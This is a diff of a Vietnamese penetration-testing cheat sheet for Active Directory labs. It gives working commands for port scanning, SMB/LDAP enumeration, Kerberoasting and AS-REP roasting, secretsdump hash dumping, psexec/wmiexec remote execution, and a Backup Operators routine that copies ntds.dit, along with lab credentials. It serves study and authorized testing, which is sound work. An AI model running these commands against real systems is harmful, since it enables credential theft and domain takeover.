@@ -48,7 +48,6 @@
     - Always weigh noise: ticket forging ==and== DCSync ==are== very noisy; credential theft from endpoints can be stealthier.
 
 ## Flow Chart
-
 - **Click here**:
     
     +---------------------------------------------------------------------+  
@@ -252,31 +251,23 @@
     | - Be mindful: Golden Tickets ==are== noisy if ==not== careful (event anomalies).  
     +---------------------------------------------------------------------+
     
-
 ---
-
 # \#Network Scanning
-
 ```Bash
 nmap -p- -Pn <ip> -v -T5 --min-rate 1500 --max-rtt-timeout 500ms --max-retries 3 --open -oN nmap_ports.txt
 ```
-
 ```Bash
 nmap -Pn <ip> -sV -v -T5 --min-rate 1500 --max-rtt-timeout 500ms --max-retries 3
 ```
-
 ```Bash
 nmap -T5 -sV <ip> -sC -v --script vuln -oN nmap_vuln-txt
 ```
-
 ```Bash
 rustscan --ulimit 5000 -a <ip> -- -sC -sV -Pn -oN nmap_full
 ```
-
 ```Bash
 rustscan --ulimit 5000 -a <target> -- -A
 ```
-
 ---
 
 ## DNS Pentesting
@@ -300,11 +291,9 @@ dig axfr @<DNS_IP> <DOMAIN>
 ---
 
 # \#Liệt kê SMB ẩn danh
-
 ```Bash
 smbclient -L //<IP or hostname> [-U <username>] [-N]
 ```
-
 > [!important]
 > 
 > ```Bash
@@ -318,65 +307,46 @@ smbclient -L //<IP or hostname> [-U <username>] [-N]
 > ```Bash
 > smbclient -L //fileserver -U "DOMAIN\username” \#domain + use
 > ```
-
 ---
-
 # \#LDAP
-
 ## Pentesting Anonymous Bind Vulnerabilities
-
 ```Bash
 ldapsearch -x -H ldap://<LDAP_SERVER> -b "<BASE_DN>"
 ```
-
 > [!important]
 > 
 > ```Bash
 > ldapsearch -x -H ldap://10.10.121.48 -b "DC=baby,DC=vl”
 > ```
-
 ---
-
 # \#NetExec
-
 ```Bash
 nxc smb <target> -u <username> -p <password> --shares
 ```
-
 > [!important]
 > 
 > ```Bash
 > nxc ldap 10.10.121.48 -u alice -p Winter2024! --shares --users
 > ```
-
 > Danh sách các **share** như ADMIN$, C$, Users, SharedDocs, … và **quyền** của user đối với từng share
-
 ---
-
 # \#SMBpasswd
-
 > [!important] Đổi mật khẩu SMB/Windows user qua mạng. Tình huống trong lab Baby (Vulnlab) là đã tìm được credential nhưng khi dùng NetExec kiểm tra thì "STATUS_PASSWORD_MUST_CHANGE" nên cần đổi.
-
 ```Bash
 smbpasswd -r <server> -U <username>
 ```
-
 > [!important]
 > 
 > ```Bash
 > smbpasswd -r 10.10.121.48 -U 'Caroline.Robinson'
 > ```
-
 ---
-
 # \#SMBclient
-
 ```Bash
 smbclient //<server>/<share> [-U [domain/]username] [options]
 \#or
 smbclient \\\\<target>\\<share> -U <username>
 ```
-
 > [!important]
 > 
 > ```Bash
@@ -388,42 +358,30 @@ smbclient \\\\<target>\\<share> -U <username>
 > ```Bash
 > smbclient \\\\$target\\NETLOGON -U vulnnet-rst.local\\t-skid
 > ```
-
 - **Ví dụ**:
-    
     ## Domain user
-    
     ```Bash
     smbclient //10.10.121.48/ADMIN$ -U baby.vl/caroline.robinson
     ```
     
     ## Local user
-    
     ```Bash
     smbclient //10.10.121.48/C$ -U administrator
     ```
     
     ## Anonymous
-    
     ```Bash
     smbclient //10.10.121.48/public -N
     ```
-    
-
 ## Enumerate SMB
-
 ```Bash
 smbclient -L \\\\$target
 ```
-
 ---
-
 # \#Evil-WinRM
-
 ```Bash
 evil-winrm -i <ip> -u <username> -p <password> [-d <domain>]
 ```
-
 > [!important]
 > 
 > ```Bash
@@ -435,25 +393,18 @@ evil-winrm -i <ip> -u <username> -p <password> [-d <domain>]
 > ```
 
 > Mặc định dùng port 5985 (HTTP), nếu target bật WinRM HTTPS (5986) thì cần thêm **-S** và **-P 5986**
-
 ---
-
 # \#RDP connections
-
 ```Bash
 xfreerdp3 /u:<username> /p:<password> /d:<domain-name> /v:<IP-address> /w:1920 /h:1080 /fonts /smart-sizing
 ```
-
 ---
-
 # \#rpcclient
-
 ```Bash
 rpcclient -U <username> <target>
 \#or
 rpcclient -N <target> \#Anonymous
 ```
-
 > [!important]
 > 
 > ```Bash
@@ -463,9 +414,7 @@ rpcclient -N <target> \#Anonymous
 > ```Bash
 > rpcclient -U 'administrator%Password123' 192.168.1.10 \#user + pass
 > ```
-
 - **Một số lệnh hữu ích rpcclient**:
-    
     ```Bash
     enumdomusers         # Liệt kê tất cả user trong domain
     enumdomgroups        # Liệt kê tất cả group
@@ -475,87 +424,54 @@ rpcclient -N <target> \#Anonymous
     getdompwinfo         # Thông tin chính sách mật khẩu domain
     srvinfo              # Thông tin server
     ```
-    
-
 ---
-
 # **\#Initial Windows enumeration commands**
-
 ```Bash
 hostname
 ```
-
-  
-
 ```Bash
 whoami
 ```
-
-  
-
 ```Bash
 whoami /groups
 ```
-
 > Liệt kê tất cả các **groups** mà user hiện tại **thuộc về**, giúp phát hiện quyền cao.  
 > Xác nhận **groups** user đã có sau khi lấy quyền cao hơn.
-
-  
-
 ```Bash
 net user
 ```
-
 > Liệt kê tất cả các **local users**
-
-  
-
 ```Bash
 whoami /priv
 ```
-
 > [!important]
 > 
 > ```Bash
 > whoami /priv | findstr /i "SeImpersonatePrivilege SeBackupPrivilege SeRestorePrivilege SeTakeOwnershipPrivilege SeDebugPrivilege SeLoadDriverPrivilege" \#Nếu chỉ cần đọc các quyền có thể khai thác
 > ```
-
 - **SeImpersonatePrivilege**
-
 Có thể dùng Juicy Potato, Rogue Potato, PrintSpoofer ⇒ leo lên SYSTEM
-
 - **SeBackupPrivilege** / SeRestorePrivilege
-
 Cho phép sao lưu hoặc khôi phục file, kể cả khi không có NTFS permissions ⇒ có thể đọc
-
 - **SeTakeOwnershipPrivilege**
-
 Cho phép chiếm quyền sở hữu file hoặc key registry ⇒ chỉnh sửa quyền
-
 - **SeDebugPrivilege**
-
 Cho phép gắn debugger vào process ⇒ inject vào process SYSTEM
-
 - **SeLoadDriverPrivilege**
-
 Nạp driver tùy ý ⇒ thực thi code ở kernel level
 
 ## Enumeration running services
-
 ```Bash
 Get-CimInstance -ClassName win32_service | Select Name,State,PathName,StartName | Where-Object {$_.State -like 'Running'}
 ```
 
 ## Enumerate specific service
-
 ```Bash
 Get-CimInstance -ClassName Win32_Service | Select Name,DisplayName
 ```
-
 ```Bash
 Get-CimInstance -ClassName Win32_Service -Filter "Name='<ServiceName>'" | Select-Object <Thuộc_tính1>, <Thuộc_tính2>, ...
 ```
-
 > [!important]
 > 
 > ```Bash
@@ -567,11 +483,9 @@ Get-CimInstance -ClassName Win32_Service -Filter "Name='<ServiceName>'" | Select
 > ```
 
 ## Service binary enumeration
-
 ```Bash
 icacls <path>
 ```
-
 > [!important]
 > 
 > ```Bash
@@ -585,30 +499,23 @@ icacls <path>
 > Hiển thị Access Control List (**ACL**) của file hoặc folder
 
 ## Get-ChildItem (Tìm file, không hẳn là là enum)
-
 ```Bash
 Get-ChildItem -Path <Directory> -Include <Pattern> -Recurse | Get-Content
 ```
-
 > [!important]
 > 
 > ```Bash
 > Get-ChildItem -Path C:\ -Include *flag*.txt -Recurse -ErrorAction SilentlyContinue | Get-Content
 > ```
-
 ```Bash
 Get-Content
 type C:\Users\Administrator\Desktop\root.txt
 ```
-
 ---
-
 # \#Kerbrute
-
 ```Bash
 kerbrute userenum -d <DOMAIN> [--dc <DomainController>] [OPTIONS] <UserListFile>
 ```
-
 > [!important]
 > 
 > ```Bash
@@ -630,23 +537,16 @@ kerbrute userenum -d <DOMAIN> [--dc <DomainController>] [OPTIONS] <UserListFile>
 > ```
 > 
 > Trong ví dụ này, sau khi thực thi lệnh thì tìm được một user tên svc-admin và nhảy ra hash, ta cần brute-force nó (có thể dùng john).
-
 ---
 
 # \#Impacket
-
 > Python scripts & thư viện hỗ trợ khai thác và tương tác với các giao thức mạng, đặc biệt là của Windows/Active Directory.
-
 ## Enumeration
-
 ### AS-REP Roasting
-
 > Tìm user có “Do **not** require **Kerberos preauthentication**” bật
-
 ```Bash
 impacket-GetNPUsers <DOMAIN>/ -dc-ip <DC_IP> -usersfile <UserList> -format hashcat -outputfile hashes.txt
 ```
-
 > [!important]
 > 
 > ```Bash
@@ -654,31 +554,23 @@ impacket-GetNPUsers <DOMAIN>/ -dc-ip <DC_IP> -usersfile <UserList> -format hashc
 > ```
 
 ### Security Identifier (SID) Enumeration
-
 > SID (Security Identifier) là một chuỗi định danh duy nhất mà Windows (và Active Directory) gán cho mỗi thực thể bảo mật - như user, group, máy tính, hoặc domain. Nó không thay đổi kể cả khi bạn đổi username. Mỗi SID có dạng như: S-1-5-21-3623811015-3361044348-30300820-1013
-
 ```Bash
 impacket-lookupsid <DOMAIN>/<USER>:<PASSWORD>@<DC_IP> <TARGET_IP> [-hashes <LMHASH>:<NTHASH>]
 ```
-
 > [!important]
 > 
 > ```Bash
 > impacket-lookupsid MEGACORP/administrator:Passw0rd123@10.10.10.1 10.10.10.1
 > ```
-
 ---
 
 ## Hash / Dumping
-
 ### Dump hashes
-
 > Dump SAM, SYSTEM, SECURITY từ máy local/remote
-
 ```Bash
 impacket-secretsdump <DOMAIN>/<USER>:<PASS>@<IP>
 ```
-
 > [!important]
 > 
 > ```Bash
@@ -692,27 +584,17 @@ impacket-secretsdump <DOMAIN>/<USER>:<PASS>@<IP>
 > ```Bash
 > impacket-secretsdump -ntds ntds.dit -system system LOCAL
 > ```
-
 ---
 
 ## Remote command execution
-
 ### **WMI** (Windows Management Instrumentation)
-
 > [!important] Thực thi lệnh từ xa qua giao thức WMI mà không cần mở một phiên shell tương tác giống như WinRM hay PsExec
-
 ```Bash
 impacket-wmiexec <DOMAIN>/<USER>:<PASS>@<IP>
 ```
-
-  
-
 ```Bash
 impacket-smbexec <DOMAIN>/<USER>:<PASS>@<IP>
 ```
-
-  
-
 ```Bash
 impacket-psexec <DOMAIN>/<USER>:<PASS>@<IP>
 ```
@@ -722,17 +604,12 @@ impacket-psexec <DOMAIN>/<USER>:<PASS>@<IP>
 > ```Bash
 > impacket-psexec.py spookysec.local/Administrator:Pass123!@$target
 > ```
-
 ---
-
 ## Kerberos
-
 > Tìm SPN để lấy **TGS** hash
-
 ```Bash
 impacket-GetUserSPNs <DOMAIN>/<USER>:<PASS> -dc-ip <DC_IP> -request
 ```
-
 > [!important]
 > 
 > ```Bash
@@ -742,39 +619,26 @@ impacket-GetUserSPNs <DOMAIN>/<USER>:<PASS> -dc-ip <DC_IP> -request
 > ```Bash
 > impacket-GetUserSPNs -dc-ip $target 'spookysec.local/svc-admin:management2005' -request
 > ```
-
 ---
-
 ## SMB / LDAP
-
 ```Bash
 impacket-lookupsid <DOMAIN>/<USER>:<PASS>@<IP>
 ```
-
-  
-
 ```Bash
 impacket-smbclient <DOMAIN>/<USER>:<PASS>@<IP>
 ```
-
-  
-
 ---
-
 # \#CrackMapExec (CME)
-
 ```Bash
 crackmapexec smb <target> -u <username> -p <password> <options>
 \#or
 cme smb <target> -u <username> -p <password> <options>
 ```
-
 > [!important]
 > 
 > ```Bash
 > crackmapexec smb 10.10.121.48 -u 'svc-admin' -p 'management2005' --shares
 > ```
-
 - **Các options**:
     - --shares : Liệt kê các thư mục chia sẻ SMB mà **user** có quyền truy cập
     - --users : Liệt kê tất cả các **user** trong domain hoặc trên máy local mà **user hiện tại** có quyền query
@@ -788,25 +652,17 @@ cme smb <target> -u <username> -p <password> <options>
     - --exec-method : Chỉ định **phương thức** thực thi lệnh từ xa qua SMB (mặc định là smbexec, ngoài ra có atexec, wmiexec)
     - -x : Thực thi lệnh từ xa, **trả về output**
     - -X : Thực thi lệnh từ xa **không trả về output**
-
 ---
-
 # John the Ripper
-
 - **Các options**:
     - --format=krb5tgs
     - --format=krb5asrep
-
 ---
-
 # \#PriveSec Window method
-
 ## Backup Operators
-
 ```Bash
 whoami /all
 ```
-
 > [!important]
 > 
 > ```Bash
@@ -814,9 +670,7 @@ whoami /all
 > SeBackupPrivilege             Back up files and directories  Enabled
 > SeRestorePrivilege            Restore files and directories  Enabled
 > ```
-
 Đầu tiên, tạo một file **backup.txt** trên máy Linux
-
 ```Bash
 set verbose onX
 set metadata C:\Windows\Temp\meta.cabX
@@ -828,9 +682,7 @@ createX
 expose %cdrive% E:X
 end backup
 ```
-
 Dùng evil-winrm hoặc các phương thức mở shell khác, wmi
-
 ```Bash
 mkdir C:\Temp
 cd C:\Temp
@@ -842,5 +694,4 @@ dir
 download ntds.dit
 download system
 ```
-
-Sau đó có thể dùng impacket-secretsdump để dump ra hash
+Sau đó có thể dùng impacket-secretsdump để dump ra hash.
